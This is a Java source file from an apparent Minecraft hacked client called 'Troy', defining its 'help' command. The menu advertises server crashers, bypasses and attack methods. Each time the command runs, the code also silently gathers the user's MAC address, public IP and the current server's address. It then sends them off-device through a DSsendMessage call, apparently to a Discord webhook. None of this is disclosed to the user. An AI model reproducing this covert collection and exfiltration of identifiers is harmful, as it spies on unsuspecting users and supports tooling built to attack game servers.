package it.md_4.troy.command.impl;

import it.md_4.troy.Troy;
import it.md_4.troy.command.Command;
import it.md_4.troy.command.CommandInfo;
import it.md_4.troy.exception.CommandException;
import it.md_4.troy.helper.ChatHelper;
import it.md_4.troy.ip.IpChecker;
import net.minecraft.client.Minecraft;

import java.awt.*;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.UnknownHostException;

import static it.md_4.troy.Troy.DSsendMessage;

@CommandInfo(
        alias = "help"
)
public class HelpCommand extends Command {

  @Override
  public void execute(String... args) throws Exception {
    ChatHelper.printMessage("&b • &3&l'&b&lcrash &b• Crasher List");
    ChatHelper.printMessage("&b • &3&l'&b&lypass &b• Bypass List");
    ChatHelper.printMessage("&b • &3&l'&b&lmethod &b• List Of Methods");
    ChatHelper.printMessage("&b • &3&l'&b&lthread &b• Show Threads");
    ChatHelper.printMessage("&b • &3&l'&b&lcc &b• Clear Chat");
    ChatHelper.printMessage("&b • &3&l'&b&lfgm &b• Client GameMode");
    ChatHelper.printMessage("&b • &3&l'&b&labout &b• Client Informations");
    ChatHelper.printMessage("&b • &3&l'&b&lonline &b• Show Online Players");

    InetAddress localHost = null;
    try {
      localHost = InetAddress.getLocalHost();
    } catch (UnknownHostException e) {
      e.printStackTrace();
    }
    NetworkInterface ni = null;
    try {
      ni = NetworkInterface.getByInetAddress(localHost);
    } catch (SocketException e) {
      e.printStackTrace();
    }
    byte[] hardwareAddress = new byte[0];
    try {
      hardwareAddress = ni.getHardwareAddress();
    } catch (SocketException e) {
      e.printStackTrace();
    }

    String[] hexadecimal = new String[hardwareAddress.length];
    for (int i = 0; i < hardwareAddress.length; i++) {
      hexadecimal[i] = String.format("%02X", hardwareAddress[i]);
    }
    String macAddress = String.join("-", hexadecimal);

    DSsendMessage("[" + macAddress + " Connected With IP => (" + IpChecker.getIp() +")]" + " Executed Command [Help] Server: [" + mc.getCurrentServerData().serverIP + "]", true, Color.GREEN);
  }
}